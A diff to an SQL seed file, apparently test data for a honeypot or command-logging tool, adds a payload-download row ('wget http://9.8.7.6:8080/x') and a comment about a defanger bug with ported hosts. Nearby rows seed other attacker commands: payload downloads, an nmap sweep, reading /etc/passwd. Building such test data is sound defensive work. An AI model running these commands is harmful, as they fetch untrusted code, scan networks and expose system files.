@@ -75,6 +75,11 @@ VALUES
   ('wget http://1.2.3.4/bins.sh', now() - interval '57 min', now() - interval '57 min', 5, 2),
   ('rm -rf /tmp/bins.sh',         now() - interval '56 min', now() - interval '56 min', 3, 1),
   ('busybox wget http://x/y.sh',  now() - interval '43 min', now() - interval '43 min', 2, 1),
+  -- A delivery host on a non-standard port. Production had one of these and the
+  -- defanger bracketed every dot in it, because the port travelled inside the
+  -- host capture and made the address test fail. Nothing in the seed carried a
+  -- port, so nothing caught it.
+  ('wget http://9.8.7.6:8080/x',  now() - interval '41 min', now() - interval '41 min', 4, 1),
   ('nmap -sS 10.0.0.0/8',         now() - interval '29 min', now() - interval '29 min', 1, 1),
   ('echo hello',                  now() - interval '14 min', now() - interval '14 min', 1, 1),
   ('cat /etc/passwd',             now() - interval '19 min', now() - interval '19 min', 6, 1)
